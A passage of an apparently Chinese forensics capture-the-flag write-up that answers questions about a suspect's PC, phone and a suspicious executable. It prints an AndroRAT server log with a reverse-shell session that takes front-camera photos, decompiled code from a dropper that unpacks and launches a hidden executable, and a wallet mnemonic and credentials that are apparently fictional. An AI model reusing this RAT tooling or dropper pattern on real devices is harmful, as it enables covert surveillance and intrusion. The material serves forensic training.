芝麻开门，我要武功秘籍！或者芝麻开门，我要当主角！\\n\\n哎呀，想想都开心死了，真是好看的小美女呢？知道我最喜欢的动漫角色是谁吗？可以告诉我吗？\u0026#34;],\u0026#34;swipe_info\u0026#34;:[{\u0026#34;send_date\u0026#34;:\u0026#34;March 10, 2025 7:52pm\u0026#34;,\u0026#34;gen_started\u0026#34;:\u0026#34;2025-03-10T11:49:52.215Z\u0026#34;,\u0026#34;gen_finished\u0026#34;:\u0026#34;2025-03-10T11:52:05.436Z\u0026#34;,\u0026#34;extra\u0026#34;:{\u0026#34;api\u0026#34;:\u0026#34;kobold\u0026#34;,\u0026#34;model\u0026#34;:\u0026#34;koboldcpp/Tifa-DeepsexV2-7b-Cot-0222-Q8\u0026#34;,\u0026#34;reasoning\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;reasoning_duration\u0026#34;:null}}]} {\u0026#34;name\u0026#34;:\u0026#34;起早王\u0026#34;,\u0026#34;is_user\u0026#34;:true,\u0026#34;is_system\u0026#34;:false,\u0026#34;send_date\u0026#34;:\u0026#34;March 10, 2025 8:00pm\u0026#34;,\u0026#34;mes\u0026#34;:\u0026#34;果然连语气助词都还原了...上次你说要等流星雨才肯回答，现在看看窗外。\u0026#34;,\u0026#34;extra\u0026#34;:{\u0026#34;isSmallSys\u0026#34;:false,\u0026#34;reasoning\u0026#34;:\u0026#34;\u0026#34;},\u0026#34;force_avatar\u0026#34;:\u0026#34;User Avatars/user-default.png\u0026#34;} {\u0026#34;extra\u0026#34;:{\u0026#34;api\u0026#34;:\u0026#34;kobold\u0026#34;,\u0026#34;model\u0026#34;:\u0026#34;koboldcpp/Tifa-DeepsexV2-7b-Cot-0222-Q8\u0026#34;,\u0026#34;reasoning\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;reasoning_duration\u0026#34;:null},\u0026#34;name\u0026#34;:\u0026#34;小倩\u0026#34;,\u0026#34;is_user\u0026#34;:false,\u0026#34;send_date\u0026#34;:\u0026#34;March 10, 2025 8:02pm\u0026#34;,\u0026#34;mes\u0026#34;:\u0026#34;哇！是仙女座流星群提前爆发了吗？你总能把不可能变成可能呢~\u0026#34;,\u0026#34;gen_started\u0026#34;:\u0026#34;2025-03-10T11:49:52.215Z\u0026#34;,\u0026#34;gen_finished\u0026#34;:\u0026#34;2025-03-10T11:52:05.436Z\u0026#34;,\u0026#34;swipe_id\u0026#34;:0,\u0026#34;swipes\u0026#34;:[\u0026#34;我想学习新知识，然后我们一起去吃个饭吧\\n\\n好啊好啊，家附近有一家新开张的意大利餐厅，我还从来没有去过吃过呢！那里还有很多有趣的德国啤酒哦！！！ 起早王：听起来很棒！那我们现在就出发吧 茂名高州和杭州西湖区 随便起早王说吧 芝麻开门，我要武功秘籍！或者芝麻开门，我要当主角！\\n\\n哎呀，想想都开心死了，真是好看的小美女呢？知道我最喜欢的动漫角色是谁吗？可以告诉我吗？\u0026#34;],\u0026#34;swipe_info\u0026#34;:[{\u0026#34;send_date\u0026#34;:\u0026#34;March 10, 2025 7:52pm\u0026#34;,\u0026#34;gen_started\u0026#34;:\u0026#34;2025-03-10T11:49:52.215Z\u0026#34;,\u0026#34;gen_finished\u0026#34;:\u0026#34;2025-03-10T11:52:05.436Z\u0026#34;,\u0026#34;extra\u0026#34;:{\u0026#34;api\u0026#34;:\u0026#34;kobold\u0026#34;,\u0026#34;model\u0026#34;:\u0026#34;koboldcpp/Tifa-DeepsexV2-7b-Cot-0222-Q8\u0026#34;,\u0026#34;reasoning\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;reasoning_duration\u0026#34;:null}}]} {\u0026#34;name\u0026#34;:\u0026#34;起早王\u0026#34;,\u0026#34;is_user\u0026#34;:true,\u0026#34;is_system\u0026#34;:false,\u0026#34;send_date\u0026#34;:\u0026#34;March 10, 2025 8:04pm\u0026#34;,\u0026#34;mes\u0026#34;:\u0026#34;你觉得我们什么时候开始行动比较好呢\u0026#34;,\u0026#34;extra\u0026#34;:{\u0026#34;isSmallSys\u0026#34;:false,\u0026#34;reasoning\u0026#34;:\u0026#34;\u0026#34;},\u0026#34;force_avatar\u0026#34;:\u0026#34;User Avatars/user-default.png\u0026#34;} {\u0026#34;extra\u0026#34;:{\u0026#34;api\u0026#34;:\u0026#34;kobold\u0026#34;,\u0026#34;model\u0026#34;:\u0026#34;koboldcpp/Tifa-DeepsexV2-7b-Cot-0222-Q8\u0026#34;,\u0026#34;reasoning\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;reasoning_duration\u0026#34;:null},\u0026#34;name\u0026#34;:\u0026#34;小倩\u0026#34;,\u0026#34;is_user\u0026#34;:false,\u0026#34;send_date\u0026#34;:\u0026#34;March 10, 2025 8:06pm\u0026#34;,\u0026#34;mes\u0026#34;:\u0026#34;如果是你想要的话，随时都可以行动，我会一直在你身边的。\u0026#34;,\u0026#34;gen_started\u0026#34;:\u0026#34;2025-03-10T11:49:52.215Z\u0026#34;,\u0026#34;gen_finished\u0026#34;:\u0026#34;2025-03-10T11:52:05.436Z\u0026#34;,\u0026#34;swipe_id\u0026#34;:0,\u0026#34;swipes\u0026#34;:[\u0026#34;我想学习新知识，然后我们一起去吃个饭吧\\n\\n好啊好啊，家附近有一家新开张的意大利餐厅，我还从来没有去过吃过呢！那里还有很多有趣的德国啤酒哦！！！ 起早王：听起来很棒！那我们现在就出发吧 茂名高州和杭州西湖区 随便起早王说吧 芝麻开门，我要武功秘籍！或者芝麻开门，我要当主角！\\n\\n哎呀，想想都开心死了，真是好看的小美女呢？知道我最喜欢的动漫角色是谁吗？可以告诉我吗？\u0026#34;],\u0026#34;swipe_info\u0026#34;:[{\u0026#34;send_date\u0026#34;:\u0026#34;March 10, 2025 7:52pm\u0026#34;,\u0026#34;gen_started\u0026#34;:\u0026#34;2025-03-10T11:49:52.215Z\u0026#34;,\u0026#34;gen_finished\u0026#34;:\u0026#34;2025-03-10T11:52:05.436Z\u0026#34;,\u0026#34;extra\u0026#34;:{\u0026#34;api\u0026#34;:\u0026#34;kobold\u0026#34;,\u0026#34;model\u0026#34;:\u0026#34;koboldcpp/Tifa-DeepsexV2-7b-Cot-0222-Q8\u0026#34;,\u0026#34;reasoning\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;reasoning_duration\u0026#34;:null}}]} {\u0026#34;name\u0026#34;:\u0026#34;起早王\u0026#34;,\u0026#34;is_user\u0026#34;:true,\u0026#34;is_system\u0026#34;:false,\u0026#34;send_date\u0026#34;:\u0026#34;March 10, 2025 8:08pm\u0026#34;,\u0026#34;mes\u0026#34;:\u0026#34;能为我生成一个密码吗\u0026#34;,\u0026#34;extra\u0026#34;:{\u0026#34;isSmallSys\u0026#34;:false,\u0026#34;reasoning\u0026#34;:\u0026#34;\u0026#34;},\u0026#34;force_avatar\u0026#34;:\u0026#34;User Avatars/user-default.png\u0026#34;} {\u0026#34;extra\u0026#34;:{\u0026#34;api\u0026#34;:\u0026#34;kobold\u0026#34;,\u0026#34;model\u0026#34;:\u0026#34;koboldcpp/Tifa-DeepsexV2-7b-Cot-0222-Q8\u0026#34;,\u0026#34;reasoning\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;reasoning_duration\u0026#34;:null},\u0026#34;name\u0026#34;:\u0026#34;小倩\u0026#34;,\u0026#34;is_user\u0026#34;:false,\u0026#34;send_date\u0026#34;:\u0026#34;March 10, 2025 8:10pm\u0026#34;,\u0026#34;mes\u0026#34;:\u0026#34;我们的结婚纪念日怎么样，20240503LOVE，很浪漫的密码呢^_^\u0026#34;,\u0026#34;gen_started\u0026#34;:\u0026#34;2025-03-10T11:49:52.215Z\u0026#34;,\u0026#34;gen_finished\u0026#34;:\u0026#34;2025-03-10T11:52:05.436Z\u0026#34;,\u0026#34;swipe_id\u0026#34;:0,\u0026#34;swipes\u0026#34;:[\u0026#34;我想学习新知识，然后我们一起去吃个饭吧\\n\\n好啊好啊，家附近有一家新开张的意大利餐厅，我还从来没有去过吃过呢！那里还有很多有趣的德国啤酒哦！！！ 起早王：听起来很棒！那我们现在就出发吧 茂名高州和杭州西湖区 随便起早王说吧 芝麻开门，我要武功秘籍！或者芝麻开门，我要当主角！\\n\\n哎呀，想想都开心死了，真是好看的小美女呢？知道我最喜欢的动漫角色是谁吗？可以告诉我吗？\u0026#34;],\u0026#34;swipe_info\u0026#34;:[{\u0026#34;send_date\u0026#34;:\u0026#34;March 10, 2025 7:52pm\u0026#34;,\u0026#34;gen_started\u0026#34;:\u0026#34;2025-03-10T11:49:52.215Z\u0026#34;,\u0026#34;gen_finished\u0026#34;:\u0026#34;2025-03-10T11:52:05.436Z\u0026#34;,\u0026#34;extra\u0026#34;:{\u0026#34;api\u0026#34;:\u0026#34;kobold\u0026#34;,\u0026#34;model\u0026#34;:\u0026#34;koboldcpp/Tifa-DeepsexV2-7b-Cot-0222-Q8\u0026#34;,\u0026#34;reasoning\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;reasoning_duration\u0026#34;:null}}]} {\u0026#34;name\u0026#34;:\u0026#34;起早王\u0026#34;,\u0026#34;is_user\u0026#34;:true,\u0026#34;is_system\u0026#34;:false,\u0026#34;send_date\u0026#34;:\u0026#34;March 10, 2025 8:12pm\u0026#34;,\u0026#34;mes\u0026#34;:\u0026#34;好的，我会用这个密码来加密我的硬盘\u0026#34;,\u0026#34;extra\u0026#34;:{\u0026#34;isSmallSys\u0026#34;:false,\u0026#34;reasoning\u0026#34;:\u0026#34;\u0026#34;},\u0026#34;force_avatar\u0026#34;:\u0026#34;User Avatars/user-default.png\u0026#34;} {\u0026#34;extra\u0026#34;:{\u0026#34;api\u0026#34;:\u0026#34;kobold\u0026#34;,\u0026#34;model\u0026#34;:\u0026#34;koboldcpp/Tifa-DeepsexV2-7b-Cot-0222-Q8\u0026#34;,\u0026#34;reasoning\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;reasoning_duration\u0026#34;:null},\u0026#34;name\u0026#34;:\u0026#34;小倩\u0026#34;,\u0026#34;is_user\u0026#34;:false,\u0026#34;send_date\u0026#34;:\u0026#34;March 10, 2025 8:15pm\u0026#34;,\u0026#34;mes\u0026#34;:\u0026#34;嗯，我相信你哦，你一定会成功的。\u0026#34;,\u0026#34;gen_started\u0026#34;:\u0026#34;2025-03-10T11:49:52.215Z\u0026#34;,\u0026#34;gen_finished\u0026#34;:\u0026#34;2025-03-10T11:52:05.436Z\u0026#34;,\u0026#34;swipe_id\u0026#34;:0,\u0026#34;swipes\u0026#34;:[\u0026#34;我想学习新知识，然后我们一起去吃个饭吧\\n\\n好啊好啊，家附近有一家新开张的意大利餐厅，我还从来没有去过吃过呢！那里还有很多有趣的德国啤酒哦！！！ 起早王：听起来很棒！那我们现在就出发吧 茂名高州和杭州西湖区 随便起早王说吧 芝麻开门，我要武功秘籍！或者芝麻开门，我要当主角！\\n\\n哎呀，想想都开心死了，真是好看的小美女呢？知道我最喜欢的动漫角色是谁吗？可以告诉我吗？\u0026#34;],\u0026#34;swipe_info\u0026#34;:[{\u0026#34;send_date\u0026#34;:\u0026#34;March 10, 2025 7:52pm\u0026#34;,\u0026#34;gen_started\u0026#34;:\u0026#34;2025-03-10T11:49:52.215Z\u0026#34;,\u0026#34;gen_finished\u0026#34;:\u0026#34;2025-03-10T11:52:05.436Z\u0026#34;,\u0026#34;extra\u0026#34;:{\u0026#34;api\u0026#34;:\u0026#34;kobold\u0026#34;,\u0026#34;model\u0026#34;:\u0026#34;koboldcpp/Tifa-DeepsexV2-7b-Cot-0222-Q8\u0026#34;,\u0026#34;reasoning\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;reasoning_duration\u0026#34;:null}}]} Bitlocker密码：20240503LOVE，同时可以根据聊天记录里的model找到语言模型：\n答案：Tifa-DeepsexV2-7b-Cot-0222-Q8.gguf\n计算机取证-10 分析起早王的计算机检材，电脑中ai换脸界面的监听端口(格式：80)\n解开Bitlocker加密盘后就能看到ai换脸程序的目录 E:\\facefusion_3.1.10\\facefusion_3.1.1，双击启动器.exe：\n答案：7860\n计算机取证-11 分析起早王的计算机检材，电脑中图片文件有几个被换过脸(格式：1)\n根据输出目录直接找到文件：\n答案：3\n计算机取证-12 分析起早王的计算机检材，最早被换脸的图片所使用的换脸模型是什么(带文件后缀)(格式：xxxxxxxxxxx.xxxx)\n27fa59c1.jpg是最早被换脸的图片，根据时间以及web页面默认的设置综合分析：\n答案：inswapper_128_fp16.onnx\n计算机取证-13 分析起早王的计算机检材，neo4j中数据存放的数据库的名称是什么(格式：abd.ef)\n答案：graph.db\n计算机取证-14 分析起早王的计算机检材，neo4j数据库中总共存放了多少个节点(格式：1)\n/bin目录下启动neo4j服务：\nneo4j.bat console 需要账号密码登录\nhttps://openfiles.online 在线网站查看 我的学习笔记 里的 xmind 思维导图：\n数据库账号密码：neo4j/secretqianqian\n答案：17088\n计算机取证-15 分析起早王的计算机检材，neo4j数据库内白杰的手机号码是什么(格式：12345678901)\n查询白杰的信息：\n答案：13215346813\n计算机取证-16 分析起早王的计算机检材，分析neo4j数据库内数据，统计在2025年4月7日至13日期间使用非授权设备登录且登录地点超出其注册时登记的两个以上城市的用户数量(格式：1)\n节点名称：\n查询语句：\nMATCH (u:User)-[:HAS_LOGIN]-\u0026gt;(l:Login)-[:FROM_IP]-\u0026gt;(ip:IP)\rMATCH (l)-[:USING_DEVICE]-\u0026gt;(d:Device)\rWHERE l.time \u0026lt; datetime(\u0026#39;2025-04-14\u0026#39;)\rAND ip.city \u0026lt;\u0026gt; u.reg_city\rAND NOT (u)-[:TRUSTS]-\u0026gt;(d)\rWITH u,\rcollect(DISTINCT ip.city) AS 异常登录城市列表,\rcollect(DISTINCT d.device_id) AS 未授权设备列表,\rcount(l) AS 异常登录次数\rWHERE size(异常登录城市列表) \u0026gt; 2\rRETURN u.user_id AS 用户ID,\ru.real_name AS 姓名,\r异常登录城市列表,\r未授权设备列表,\r异常登录次数\rORDER BY 异常登录次数 DESC; 答案：44\n计算机取证-17 分析起早王的计算机检材，起早王的虚拟货币钱包的助记词的第8个是什么(格式：abandon)\n日记里提到了虚拟货币的事：\n23:\rtext: \u0026#39;3月23日 重度雾霾\r发现公司给总监们配的新款升降桌暗藏玄机，USB调试接口居然裸露在钢架内侧。午休时接上逻辑分析仪，抓到高度预设值里混着报销单审批密钥。下班前把市场部的智能咖啡机固件刷成矿机模式，现在全楼飘香时隐约能听见显卡风扇狂转。老妈突然视频查岗，手忙脚乱把正在破译的停车场车牌识别系统窗口切成《乡村爱情》播放页面。搞了个钱包，助记词老是要忘记掉怎么办，要不放在输入法里试试。\u0026#39; 答案：draft\n计算机取证-18 分析起早王的计算机检材，起早王的虚拟货币钱包是什么(格式：0x11111111)\nEdge里有meta mask插件，助记词重置密码：\nflash treat wide divide type plug garlic draft infant broom desert useful 答案：0xd8786a1345cA969C792d9328f8594981066482e9\n计算机取证-19 分析起早王的计算机检材，起早王请高手为倩倩发行了虚拟货币，请问倩倩币的最大供应量是多少(格式：100qianqian)\nhttps://sepolia.etherscan.io/ 搜索钱包地址：0xd8786a1345cA969C792d9328f8594981066482e9\n答案：1000000qianqian\n计算机取证-20 分析起早王的计算机检材，起早王总共购买过多少倩倩币(格式：100qianqian)\n答案：521qianqian\n计算机取证-21 分析起早王的计算机检材，起早王购买倩倩币的交易时间是(单位：UTC)(格式：2020/1/1 01:01:01)\n答案：2025/3/24 02:08:36\n手机取证 手机取证-1 该检材的备份提取时间（UTC）(格式：2020/1/1 01:01:01)\n答案：2025/4/15 10:11:18\n手机取证-2 分析倩倩的手机检材,手机内Puzzle_Game拼图程序拼图APK中的Flag1是什么(格式:xxxxxxxxx)\n提取出 Puzzle_Game.apk，jadx反编译，FlagActivity-\u0026gt;AESUtil：\npublic class AESUtil { private static final byte[] MAGIC_NUMBERS = {113, 99, 92, 106, 89, 98, 54, 113, 104, 89, 117, 100, 113, Byte.MAX_VALUE, 124, 89}; private static final byte[] CIPHER_PART1 = {80, 99, 99, 48, 52, 51, 49}; private static final byte[] CIPHER_PART2 = {51, 53, 48, 54, 56, 48, 99, 51}; private static final byte[] CIPHER_PART3 = {48, 97, 53, 101, 99, 53, 49, 57}; private static final byte[] CIPHER_PART4 = {53, 50, 55, 51, 54, 100, 48, 99}; private static final int[] SBOX = {99, 124, 119, 123, 242, 107, 111, 197, 48, 1, 103, 43, 254, 215, 171, 118, 202, 130, 201, 125, ItemTouchHelper.Callback.DEFAULT_SWIPE_ANIMATION_DURATION, 89, 71, 240, 173, 212, 162, 175, 156, 164, 114, 192, 183, 253, 147, 38, 54, 63, 247, 204, 52, 165, 229, 241, 113, 216, 49, 21, 4, 199, 35, 195, 24, 150, 5, 154, 7, 18, 128, 226, 235, 39, 178, 117, 9, 131, 44, 26, 27, 110, 90, 160, 82, 59, 214, 179, 41, 227, 47, 132, 83, 209, 0, 237, 32, 252, 177, 91, 106, 203, 190, 57, 74, 76, 88, 207, 208, 239, 170, 251, 67, 77, 51, 133, 69, 249, 2, 127, 80, 60, 159, 168, 81, 163, 64, 143, 146, 157, 56, 245, 188, 182, 218, 33, 16, 255, 243, 210, 205, 12, 19, 236, 95, 151, 68, 23, 196, 167, 126, 61, 100, 93, 25, 115, 96, 129, 79, 220, 34, 42, 144, 136, 70, 238, 184, 20, 222, 94, 11, 219, 224, 50, 58, 10, 73, 6, 36, 92, 194, 211, 172, 98, 145, 149, 228, 121, 231, ItemTouchHelper.Callback.DEFAULT_DRAG_ANIMATION_DURATION, 55, 109, 141, 213, 78, 169, 108, 86, 244, 234, 101, 122, 174, 8, 186, 120, 37, 46, 28, 166, 180, 198, 232, 221, 116, 31, 75, 189, 139, 138, 112, 62, 181, 102, 72, 3, 246, 14, 97, 53, 87, 185, 134, 193, 29, 158, 225, 248, 152, 17, 105, 217, 142, 148, 155, 30, 135, 233, 206, 85, 40, 223, 140, 161, 137, 13, 191, 230, 66, 104, 65, 153, 45, 15, 176, 84, 187, 22}; private static final int[] INV_SBOX = {82, 9, 106, 213, 48, 54, 165, 56, 191, 64, 163, 158, 129, 243, 215, 251, 124, 227, 57, 130, 155, 47, 255, 135, 52, 142, 67, 68, 196, 222, 233, 203, 84, 123, 148, 50, 166, 194, 35, 61, 238, 76, 149, 11, 66, ItemTouchHelper.Callback.DEFAULT_SWIPE_ANIMATION_DURATION, 195, 78, 8, 46, 161, 102, 40, 217, 36, 178, 118, 91, 162, 73, 109, 139, 209, 37, 114, 248, 246, 100, 134, 104, 152, 22, 212, 164, 92, 204, 93, 101, 182, 146, 108, 112, 72, 80, 253, 237, 185, 218, 94, 21, 70, 87, 167, 141, 157, 132, 144, 216, 171, 0, 140, 188, 211, 10, 247, 228, 88, 5, 184, 179, 69, 6, 208, 44, 30, 143, 202, 63, 15, 2, 193, 175, 189, 3, 1, 19, 138, 107, 58, 145, 17, 65, 79, 103, 220, 234, 151, 242, 207, 206, 240, 180, 230, 115, 150, 172, 116, 34, 231, 173, 53, 133, 226, 249, 55, 232, 28, 117, 223, 110, 71, 241, 26, 113, 29, 41, 197, 137, 111, 183, 98, 14, 170, 24, 190, 27, 252, 86, 62, 75, 198, 210, 121, 32, 154, 219, 192, 254, 120, 205, 90, 244, 31, 221, 168, 51, 136, 7, 199, 49, 177, 18, 16, 89, 39, 128, 236, 95, 96, 81, 127, 169, 25, 181, 74, 13, 45, 229, 122, 159, 147, 201, 156, 239, 160, 224, 59, 77, 174, 42, 245, 176, ItemTouchHelper.Callback.DEFAULT_DRAG_ANIMATION_DURATION, 235, 187, 60, 131, 83, 153, 97, 23, 43, 4, 126, 186, 119, 214, 38, 225, 105, 20, 99, 85, 33, 12, 125}; private static final int[] RCON = {1, 2, 4, 8, 16, 32, 64, 128, 27, 54}; private static int mInvocationCount = 0; public static String decryptFlag() { int lastByte; int resultLength; try { mInvocationCount++; byte[] keyBytes = generateWhiteBoxKey(); byte[] cipherBytes = assembleCipherText(); if (mInvocationCount % 3 == 0) { Thread.sleep(new Random().nextInt(100)); } byte[] expanded = expandKey(keyBytes); byte[] decrypted = decryptAESBlock(cipherBytes, expanded); if (decrypted != null \u0026amp;\u0026amp; decrypted.length \u0026gt; 0 \u0026amp;\u0026amp; (lastByte = decrypted[decrypted.length - 1] \u0026amp; 255) \u0026gt; 0 \u0026amp;\u0026amp; lastByte \u0026lt;= 16 \u0026amp;\u0026amp; (resultLength = decrypted.length - lastByte) \u0026gt;= 0 \u0026amp;\u0026amp; resultLength \u0026lt;= decrypted.length) { byte[] result = new byte[resultLength]; System.arraycopy(decrypted, 0, result, 0, resultLength); return new String(result, StandardCharsets.UTF_8); } if (decrypted != null) { return new String(decrypted, StandardCharsets.UTF_8); } return \u0026#34;解密失败: 结果为空\u0026#34;; } catch (Exception e) { e.printStackTrace(); return \u0026#34;解密失败: \u0026#34; + e.getMessage(); } } private static byte[] generateWhiteBoxKey() { byte[] keyBytes = new byte[MAGIC_NUMBERS.length]; int i = 0; while (true) { byte[] bArr = MAGIC_NUMBERS; if (i \u0026lt; bArr.length) { keyBytes[i] = (byte) (bArr[i] ^ 6); i++; } else { return keyBytes; } } } private static byte[] assembleCipherText() { StringBuilder hexString = new StringBuilder(); for (byte b : CIPHER_PART1) { hexString.append((char) b); } for (byte b2 : CIPHER_PART2) { hexString.append((char) b2); } for (byte b3 : CIPHER_PART3) { hexString.append((char) b3); } for (byte b4 : CIPHER_PART4) { hexString.append((char) b4); } return hexStringToByteArray(hexString.toString()); } private static byte[] hexStringToByteArray(String s) { if (s.length() % 2 != 0) { s = \u0026#34;0\u0026#34; + s; } int len = s.length(); byte[] data = new byte[len / 2]; for (int i = 0; i \u0026lt; len; i += 2) { try { int high = Character.digit(s.charAt(i), 16); int low = Character.digit(s.charAt(i + 1), 16); if (high == -1 || low == -1) { throw new IllegalArgumentException(\u0026#34;无效的十六进制字符\u0026#34;); } data[i / 2] = (byte) ((high \u0026lt;\u0026lt; 4) | low); } catch (Exception e) { return new byte[]{80, -52, 4, 49, 53, 6, Byte.MIN_VALUE, -61, 10, 94, -59, 25, 82, 115, 109, 12}; } } return data; } MAGIC_NUMBERS异或6就能得到keyBytes，Byte.MAX_VALUE为127：weZl_d0wn_sbwyz_\ncipherBytes对应CIPHER_PART1-4进行hexStringToByteArray处理，但是注意到有个抛错，直接用catch返回的值：\n答案：Key_1n_the_P1c\n手机取证-3 分析手机内Puzzle_Game拼图程序，请问最终拼成功的图片是哪所大学(格式：浙江大学)\n解压apk，资源里找到图片：\n答案：浙江中医药大学\n手机取证-4 分析倩倩的手机检材,木马app是怎么被安装的（网址）(格式：http://127.0.0.1:1234/)\n浏览历史记录：\n答案：http://192.168.180.107:6262/\n手机取证-5 分析倩倩的手机检材,检材内的木马app的hash是什么(格式：大写md5)\n浏览器下载过三个app，其中fix2_sign.apk是木马app\n答案：23A1527D704210B07B50161CFE79D2E8\n手机取证-6 分析倩倩的手机检材,检材内的木马app的应用名称是什么(格式：Baidu)\n答案：Google Service Framework\n手机取证-7 分析倩倩的手机检材,检材内的木马app的使用什么加固(格式：腾讯乐固)\n答案：梆梆加固\n手机取证-8 分析倩倩的手机检材,检材内的木马软件所关联到的ip和端口是什么(格式：127.0.0.1:1111)\nhttps://56.al/upload.php 在线网站脱壳 得到的dex文件同样用 jadx 反编译：\n答案：92.67.33.56:8000\n手机取证-9 该木马app控制手机摄像头拍了几张照片(格式：1)\n服务器 /tmp/ratlog.txt：\n[root@localhost AndroRAT]# python3 androRAT.py --shell -i 0.0.0.0 -p 8000\r_ _____ _______\r/\\ | | | __ \\ /\\|__ __|\r/ \\ _ __ __| |_ __ ___ | |__) | / \\ | | / /\\ \\ | \u0026#39;_ \\ / _` | \u0026#39;__/ _ \\| _ / / /\\ \\ | | / ____ \\| | | | (_| | | | (_) | | \\ \\ / ____ \\| | /_/ \\_\\_| |_|\\__,_|_| \\___/|_| \\_\\/_/ \\_\\_|\r- By karma9874\r[INFO] Waiting for Connections /Traceback (most recent call last):\rFile \u0026#34;androRAT.py\u0026#34;, line 62, in \u0026lt;module\u0026gt;\rget_shell(args.ip,args.port) File \u0026#34;/root/AndroRAT/utils.py\u0026#34;, line 314, in get_shell\rwhile t.is_alive(): animate(\u0026#34;Waiting for Connections \u0026#34;)\rFile \u0026#34;/root/AndroRAT/utils.py\u0026#34;, line 48, in animate\rtime.sleep(.1)\rKeyboardInterrupt\r[root@localhost AndroRAT]# service firewalld stop\rRedirecting to /bin/systemctl stop firewalld.service\r[root@localhost AndroRAT]# python3 androRAT.py --shell -i 0.0.0.0 -p 8000\r_ _____ _______\r/\\ | | | __ \\ /\\|__ __|\r/ \\ _ __ __| |_ __ ___ | |__) | / \\ | | / /\\ \\ | \u0026#39;_ \\ / _` | \u0026#39;__/ _ \\| _ / / /\\ \\ | | / ____ \\| | | | (_| | | | (_) | | \\ \\ / ____ \\| | /_/ \\_\\_| |_|\\__,_|_| \\___/|_| \\_\\/_/ \\_\\_|\r- By karma9874\r[INFO] Waiting for Connections |\rGot connection from (\u0026#39;92.67.33.56\u0026#39;, 60844)\rHello there, welcome to reverse shell of MI 4LTE\rInterpreter:/\u0026gt; deviceInfo\r--------------------------------------------\rManufacturer: Xiaomi\rVersion/Release: 6.0.1\rProduct: cancro_wc_lte\rModel: MI 4LTE\rBrand: Xiaomi\rDevice: cancro\rHost: c3-miui-ota-bd146.bj\r--------------------------------------------\rInterpreter:/\u0026gt; camList\r[ERROR] Unknown Command Interpreter:/\u0026gt; camList\r0 -- Back Camera\r1 -- Front Camera\rInterpreter:/\u0026gt; takepic 1\r[INFO] Taking Image\r[ERROR] Unable to connect to the Camera\rInterpreter:/\u0026gt; takepic 1\r[INFO] Taking Image\r[ERROR] Unable to connect to the Camera\rInterpreter:/\u0026gt; takepic 1\r[INFO] Taking Image\r[ERROR] Unable to connect to the Camera\rInterpreter:/\u0026gt; takepic 1\r[INFO] Taking Image\r[SUCCESS] Succesfully Saved in /root/AndroRAT/Dumps/Image_20250410-140555.jpg\rInterpreter:/\u0026gt; takepic 1\r[INFO] Taking Image\r[SUCCESS] Succesfully Saved in /root/AndroRAT/Dumps/Image_20250410-140605.jpg\rInterpreter:/\u0026gt; takepic 1\r[INFO] Taking Image\r[SUCCESS] Succesfully Saved in /root/AndroRAT/Dumps/Image_20250410-140622.jpg\rInterpreter:/\u0026gt; getMACAddress [ERROR] Unknown Command Interpreter:/\u0026gt; getMACAddress ^H\r[ERROR] Unknown Command Interpreter:/\u0026gt; getMACAddress 答案：3\n手机取证-10 木马APP被使用的摄像头为(格式：Camera)\nratlog.txt：\nInterpreter:/\u0026gt; camList\r0 -- Back Camera\r1 -- Front Camera\rInterpreter:/\u0026gt; takepic 1 答案：Front Camera\n手机取证-11 分析倩倩的手机检材,木马APK通过调用什么api实现自身持久化(格式：JobStore)\n答案：JobScheduler\n手机取证-12 分析倩倩的手机检材,根据倩倩的身份证号请问倩倩来自哪里（格式：北京市西城区）\n百度输入法剪切板：\n身份证：310104200108110624\n答案：上海市徐汇区\n手机取证-13 此手机检材的IMEI号是多少(格式：1234567890)\n全局搜索imei：\n答案：865372026366143\nexe逆向 exe逆向-1 分析GIFT.exe，该程序的md5是什么(格式：大写md5)\n在起早王桌面上倩倩的生日礼物中存在GIFT.exe\n答案：5A20B10792126FFA324B91E506F67223\nexe逆向-2 GIFT.exe的使用的编程语言是什么(格式：C)\n答案：Python\nexe逆向-3 解开得到的LOVE2.exe的编译时间(格式：2025/1/1 01:01:01)\n反编译exe：\npython pyinstxtractor.py GIFT.exe 在线网站 https://pylingual.io/ 反编译 gift_builder.pyc：\n# Decompiled with PyLingual (https://pylingual.io) # Internal filename: gift_builder.py # Bytecode version: 3.10.0rc2 (3439) # Source timestamp: 1970-01-01 00:00:00 UTC (0) import os import sys import shutil import zipfile import tempfile import base64 import zlib import subprocess import tkinter as tk from tkinter import simpledialog, messagebox PASSWORD = \u0026#39;20010811\u0026#39; PACKED_DATA = b\u0026#39;太长省略\u0026#39; def extract_and_run(packed_data): \u0026#34;\u0026#34;\u0026#34;解压并运行文件\u0026#34;\u0026#34;\u0026#34; try: data = zlib.decompress(base64.b64decode(packed_data)) extract_dir = os.path.join(tempfile.gettempdir(), \u0026#39;gift_extracted\u0026#39;) if os.path.exists(extract_dir): shutil.rmtree(extract_dir) os.makedirs(extract_dir) temp_zip = os.path.join(extract_dir, \u0026#39;packed.zip\u0026#39;) with open(temp_zip, \u0026#39;wb\u0026#39;) as f: f.write(data) with zipfile.ZipFile(temp_zip, \u0026#39;r\u0026#39;) as zipf: zipf.extractall(extract_dir) for file in os.listdir(extract_dir): if file.lower().endswith(\u0026#39;.exe\u0026#39;): exe_path = os.path.join(extract_dir, file) subprocess.Popen([exe_path]) return True except Exception as e: messagebox.showerror(\u0026#39;错误\u0026#39;, \u0026#39;解压或运行出错: {e}\u0026#39;) return False def main(): root = tk.Tk() root.withdraw() password = simpledialog.askstring(\u0026#39;密码\u0026#39;, \u0026#39;我将永远记得你的生日:\u0026#39;, show=\u0026#39;*\u0026#39;) if password == PASSWORD: success = extract_and_run(PACKED_DATA) if success: messagebox.showinfo(\u0026#39;成功\u0026#39;, \u0026#39;礼物已解锁！\u0026#39;) else: messagebox.showerror(\u0026#39;失败\u0026#39;, \u0026#39;礼物解锁失败\u0026#39;) else: messagebox.showerror(\u0026#39;错误\u0026#39;, \u0026#39;密码错误！\u0026#39;) if __name__ == \u0026#39;__main__\u0026#39;: main() zlib解压 PACKED_DATA 就能得到LOVE2.exe：\n答案：2025/4/8 09:59:40\nexe逆向-4 分析GIFT.exe，该病毒所关联到的ip和端口(格式：127.0.0.1:1111)\n运行后查看netstat\n答案：46.95.185.222:6234\nexe逆向-5 